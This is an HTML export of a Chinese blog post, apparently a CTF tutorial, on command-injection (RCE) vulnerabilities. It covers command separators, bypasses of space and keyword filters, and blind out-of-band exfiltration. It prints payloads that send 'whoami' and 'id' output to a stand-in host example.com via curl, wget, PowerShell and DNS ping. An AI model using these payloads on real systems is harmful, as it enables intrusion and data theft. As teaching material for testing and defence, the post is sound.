@@ -1,0 +1,791 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/ca2276a41c66b.ico">
+  <link rel="icon" href="/img/ca2276a41c66b.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="呜呼呜呼呜">
+  <meta name="author" content="4eg1s">
+  <meta name="keywords" content="">
+  <meta name="description" content="命令执行漏洞 命令执行一般发生在远程，故被称为远程命令执行，即RCE（Remote Command Exec），也被称为Remote Code Exec 用途：  技巧性获取Flag 进行反弹Shell 利用出题人对权限的控制不严格，对题目拥有控制权，导致其他队伍选手无法解题   命令执行命令执行原理 通常会存在各种执行外部程序的函数，当调用函数执行且未对输入做过滤时，通过注入恶意命令，会造成巨大">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令注入_1">
+<meta property="og:url" content="http://encr.cc/2021/11/06/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-1/index.html">
+<meta property="og:site_name" content="4eg1s_Blog">
+<meta property="og:description" content="命令执行漏洞 命令执行一般发生在远程，故被称为远程命令执行，即RCE（Remote Command Exec），也被称为Remote Code Exec 用途：  技巧性获取Flag 进行反弹Shell 利用出题人对权限的控制不严格，对题目拥有控制权，导致其他队伍选手无法解题   命令执行命令执行原理 通常会存在各种执行外部程序的函数，当调用函数执行且未对输入做过滤时，通过注入恶意命令，会造成巨大">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211102162634330.png">
+<meta property="article:published_time" content="2021-11-06T08:56:49.000Z">
+<meta property="article:modified_time" content="2021-11-07T04:57:00.378Z">
+<meta property="article:author" content="4eg1s">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211102162634330.png">
+  
+  <title>命令注入_1 - 4eg1s_Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/mac.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"encr.cc","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":30,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ueiSOp1tIMRKg9f27oOtuObS-gzGzoHsz","app_key":"0zdAw1UsO8S6X9AIrLLG3TSf","server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="4eg1s_Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>4eg1s&#39;Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="命令注入_1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-06 16:56" pubdate>
+        2021年11月6日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.3k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      10 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">命令注入_1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><blockquote>
+<p>命令执行一般发生在远程，故被称为远程命令执行，即<code>RCE（Remote Command Exec）</code>，也被称为<code>Remote Code Exec</code></p>
+<p>用途：</p>
+<ul>
+<li>技巧性获取Flag</li>
+<li>进行反弹Shell</li>
+<li>利用出题人对权限的控制不严格，对题目拥有控制权，导致其他队伍选手无法解题</li>
+</ul>
+</blockquote>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="命令执行原理"><a href="#命令执行原理" class="headerlink" title="命令执行原理"></a>命令执行原理</h3><blockquote>
+<p>通常会存在各种执行外部程序的函数，当调用函数执行且未对输入做过滤时，通过注入恶意命令，会造成巨大危害</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>	system(<span class="hljs-string">&#x27;echo&#x27;</span>. <span class="hljs-variable">$dir</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>通常为了解决url中的歧义表达，会将一些特殊字符进行URL编码，%26就是&amp;的意思，在编程语言中，&amp;&amp;是and语法的表达：</p>
+<p>​                                                                        <code>（表达式1）and （表达式2）</code></p>
+<p>​    当两边表达式都为真时，才会返回真，；类似的：or 语法 用<code>||</code> 表示，（注意他们之间存在惰性）<br>在and语法中，若第一个表达式结果为假，则第二个表达式也不会执行，因为它的恒为假<br>在or语法中，若第一个表达式为真，则第二个表达式也不会执行，因为它的恒为真</p>
+<p>​    命令注入就是通过注入一些特殊字符，改变原本的执行意图，从而执行攻击者指定的指令</p>
+<h3 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h3><h4 id="1、转义字符"><a href="#1、转义字符" class="headerlink" title="1、转义字符"></a>1、转义字符</h4><blockquote>
+<p>转义字符即为取消字符的特殊意义</p>
+</blockquote>
+<ul>
+<li>Windows<ul>
+<li>转义字符为<code>^</code></li>
+</ul>
+</li>
+<li>Linux<ul>
+<li>转义字符为<code>\</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="2、多条命令执行"><a href="#2、多条命令执行" class="headerlink" title="2、多条命令执行"></a>2、多条命令执行</h4><p>下面是一些能构成多条命令执行的字符串：</p>
+<ul>
+<li>Windows<ul>
+<li><code>&amp;&amp;</code></li>
+<li><code>||</code></li>
+<li><code>%0a</code></li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><code>&amp;&amp;</code></li>
+<li><code>||</code></li>
+<li><code>;</code></li>
+<li><code>$()</code></li>
+<li>``</li>
+<li><code>%0a</code></li>
+<li><code>%0d</code></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>在Linux下要注意：双引号包裹起来的字符串<code>$()</code>或者``的内容被当做命令执行，但是单引号包裹起来的字符串就是纯字符串，不会进行任何解析</p>
+</blockquote>
+<h4 id="3、注释符号"><a href="#3、注释符号" class="headerlink" title="3、注释符号"></a>3、注释符号</h4><ul>
+<li>Windows<ul>
+<li><code>::</code><ul>
+<li>在BAT批处理脚本中用得比较多</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><code>#</code><ul>
+<li>在bash脚本中用的比较多</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="命令执行的基本测试"><a href="#命令执行的基本测试" class="headerlink" title="命令执行的基本测试"></a>命令执行的基本测试</h3><p>​    在面对未知的命令注入时，最好通过各种Fuzz来确认命令注入点和黑名单规则</p>
+<p>​                            <code>程序名1 -程序参数1 参数值1 &amp;&amp; 程序2 -程序参数名2 参数值2</code></p>
+<p>示例： </p>
+<p><code>ping -nc 1 www.baidu.com</code></p>
+<ul>
+<li><p>程序名：<code>ping</code></p>
+</li>
+<li><p>参数：<code>-nc</code></p>
+</li>
+<li><p>参数值：<code>1</code>和<code>www.baidu.com</code></p>
+</li>
+<li><p>程序名与参数值之间的字符串：空格</p>
+</li>
+<li><p>整个命令</p>
+<p>参数值有时较为复杂，可能部分可控，被双引号、单引号包裹，这时候需要注入额外的引号来逃逸</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&amp;&amp; curl www.vps.com &amp;&amp;<br>`curl www.vps.com`<br>;curl www.vps.com;<br></code></pre></td></tr></table></figure>
+
+<p>再通过将Fuzz列表插入命令点后，通过查看自己服务器的Web日志来观察是否存在漏洞</p>
+<h2 id="命令执行的绕过技巧"><a href="#命令执行的绕过技巧" class="headerlink" title="命令执行的绕过技巧"></a>命令执行的绕过技巧</h2><h3 id="缺少空格"><a href="#缺少空格" class="headerlink" title="缺少空格"></a>缺少空格</h3><p>​    在一些代码审计中经常会禁止空格的出现或者将空格过滤为空。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span> = str_replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;CMD:&quot;</span> . <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>将CMD参数中空格过滤为空，导致执行<code>echo pwnpwn</code>失败，但是在命令中间隔的字符可以不只是空格，利用<code>Burpsuite</code>对%00~%ff区间的字符串进行测试。</p>
+<p>​    利用Burp Suite进行Fuzz，可以发现其他字符也可以过滤；也可以通过字符串截取的方式获取空格</p>
+<h4 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a>Windows下</h4><p><code>%ProgramFiles:~10,1%</code></p>
+<ul>
+<li><code>~</code>相当于截取符<ul>
+<li>表示获取环境变量<code>%ProgramFiles%</code>的值：C:\Program Files</li>
+</ul>
+</li>
+</ul>
+<p>以上命令表示：从第10个开始且获取一个字符串，也就是空格</p>
+<h4 id="Linux下"><a href="#Linux下" class="headerlink" title="Linux下"></a>Linux下</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$IFS<span class="hljs-variable">$9</span> <span class="hljs-comment"># 绕过空格</span><br>&#123;cmd,args&#125; <span class="hljs-comment"># bash有效，zsh、dash无效</span><br>cat&lt;&gt;flag <span class="hljs-comment"># 读取文件时</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>$IFS$9</code></p>
+<ul>
+<li><p>Linux存在IFS（Internal Field Separator）环境变量，即内部字段分隔符，定义了bash shell 的命令间隔字符，一般为空格。</p>
+</li>
+<li><blockquote>
+<p>当只注入<code>$IFS</code>时，即执行的命令结果为<code>echo$IFSaaa</code>，解析后的变量是不存在的，所以需要间隔符来避免，通常使用<code>$9</code>，其表示当前系统shell经常的==第九个参数==，通常是个==空字符串==。即最后执行的命令为<code>echo$IFS$9aaa</code></p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><code>$&#123;IFS&#125;​</code></p>
+</li>
+<li><p>或者在某些平台下通过修改IFS变量为逗号来进行注入</p>
+<ul>
+<li><code>;IFS=,;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="黑名单关键字"><a href="#黑名单关键字" class="headerlink" title="黑名单关键字"></a>黑名单关键字</h3><h4 id="1、利用变量拼接"><a href="#1、利用变量拼接" class="headerlink" title="1、利用变量拼接"></a>1、利用变量拼接</h4><p><code>Linux: a=c;b=at;c=he;d=llo; $a$b   $&#123;c&#125;$&#123;d&#125;</code></p>
+<p>其中，a变量为c，b变量为at，最终拼接即为cat，c变量为he，d变量为llo，最终拼接为hello</p>
+<h4 id="2、使用通配符"><a href="#2、使用通配符" class="headerlink" title="2、使用通配符"></a>2、使用通配符</h4><p>​        “?”代表任意一个字符串，“*”代表任意个字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /tm?/fla*	(Linux)<br><span class="hljs-built_in">type</span> fla*		(Windows)<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="3、借用已有字符串"><a href="#3、借用已有字符串" class="headerlink" title="3、借用已有字符串"></a>3、借用已有字符串</h4><p>​        若是禁用了<code>&lt;&gt;?</code>等字符串，则可以借用其他文件中的字符串，利用substr()函数截取出某个具体字符</p>
+<p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211102162634330.png" srcset="/img/loading.gif" lazyload alt="image-20211102162634330"></p>
+<h3 id="执行无回显"><a href="#执行无回显" class="headerlink" title="执行无回显"></a>执行无回显</h3><blockquote>
+<p>推荐平台：VTest平台[VTest][<a target="_blank" rel="noopener" href="https://github.com/opensec-cn/vtest]">https://github.com/opensec-cn/vtest]</a></p>
+</blockquote>
+<h4 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h4><h4 id="HTTP通道"><a href="#HTTP通道" class="headerlink" title="HTTP通道"></a>HTTP通道</h4><p>​    在Windows下，目前只能通过相对复杂的命令进行外带：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %x <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;echo hello&#x27;</span>) <span class="hljs-keyword">do</span> <span class="hljs-built_in">start</span> http://example.com/httplog/%x<br></code></pre></td></tr></table></figure>
+
+<p>假设自己搭建平台的域名为<a target="_blank" rel="noopener" href="http://example.com/%EF%BC%8C%E9%80%9A%E8%BF%87for%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%B0%86echo">http://example.com/，通过for命令，将echo</a> hello的执行结果保存%x变量中，然后拼接到URL后</p>
+<p>其缺陷是调用浏览器后并不会关闭，并且遇上特殊字符、空格时会存在截断问题，可以借助powershell进行数据外带</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %x <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;echo hello&#x27;</span>) <span class="hljs-keyword">do</span> powershell <span class="hljs-variable">$a</span> = [<span class="hljs-type">System.Convert</span>]::<br>			ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-string">&#x27;%x&#x27;</span>)); <span class="hljs-variable">$b</span>= <span class="hljs-built_in">New-Object</span><br>			Sytem.Net.WebClient;<span class="hljs-variable">$b</span>.DownloadString(<span class="hljs-string">&#x27;http://example.com/httplog/&#x27;</span>+<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
+
+<p>​    在Linux下通常利用cURL、wget等程序外带数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl example.com/`whoami`<br>wget example.com/$(id|base64)<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="2、DNS通道"><a href="#2、DNS通道" class="headerlink" title="2、DNS通道"></a>2、DNS通道</h4><blockquote>
+<p>以ping来测试DNS外带数据，ping的参数在win和linux下是有些不同，例如限制ping的个数，win下是<code>-n</code>，Linux下是<code>-c</code>，为了处理兼容性，联合使用<code>ping -nc 1 test.com</code></p>
+</blockquote>
+<p>​    在Linux下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 1 `whoami`.example.com<br></code></pre></td></tr></table></figure>
+
+<p>​    在windows下，相对复杂，主要利用<code>delims</code>命令进行分割处理，最终拼接到域名前缀上，在利用ping程序外带</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 1、获取计算机名</span><br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;delims=\&quot;</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> %i.xxx.example.com<br><br><span class="hljs-comment"># 2、获取用户名</span><br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;delims=\&quot;</span> tokens=<span class="hljs-number">2</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> %i.xxx.example.com<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="3、时间盲注"><a href="#3、时间盲注" class="headerlink" title="3、时间盲注"></a>3、时间盲注</h4><p>网络不通时，主要借用<code>&amp;&amp;</code>和<code>||</code>的惰性，利用时间盲注将其跑出来；</p>
+<p>Linux下可以使用sleep函数</p>
+<p>Windows下可以选择一些耗时的命令。如<code>ping -n 5 127.0.0.1</code></p>
+<h4 id="4、写入文件，二次返回"><a href="#4、写入文件，二次返回" class="headerlink" title="4、写入文件，二次返回"></a>4、写入文件，二次返回</h4><p>​        如果遇到网络隔离的情况，time型读数据将会极其缓慢，可以将执行命令结果写入到Web目录下，再次通过Web访问文件从而到达回显目的</p>
+<p>例如：通过<code>&gt;</code>进行重定向，将结果导出到Web目录<code>http://xxx.com/xx/3.php?cmd=whoami&gt;test</code>，再次访问文件<code>http://xxx.com/xx/test</code>就可以看到结果</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+<footer class="text-center mt-5 py-3">
+  
+   <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>  
+  <!-- 添加网站运行时间 -->
+  <div class="footer-content">
+    <div>
+      <span id="timeDate">载入天数...</span>
+      <span id="times">载入时分秒...</span>
+      <script>
+      var now = new Date();
+      function createtime(){
+          var grt= new Date("11/05/2021 00:00:00");//此处修改你的建站时间或者网站上线时间
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24;
+          dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+          hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+          }
+          minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes);
+          if(String(mnum).length ==1 ){
+                    mnum = "0" + mnum;
+          }
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds);
+          if(String(snum).length ==1 ){
+                    snum = "0" + snum;
+          }
+          document.getElementById("timeDate").innerHTML = "🚀 &nbsp"+dnum+"&nbsp天";  //此次自定义显示内容
+          document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+      }  //此次自定义显示内容
+      setInterval("createtime()",250);
+      </script>
+    </div>
+  </div>
+      
+
+
+<!-- SCRIPTS -->
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        
+      </a>
+    </span>
+    
+      
+        <span>
+          <a
+            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=2020039562"
+            rel="nofollow noopener"
+            class="beian-police"
+            target="_blank"
+          >
+            
+              <span style="visibility: hidden; width: 0">|</span>
+              <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+            
+            <span>鲁ICP备2020039562号-2</span>
+          </a>
+        </span>
+      
+    
+  </div>
+
+
+  
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
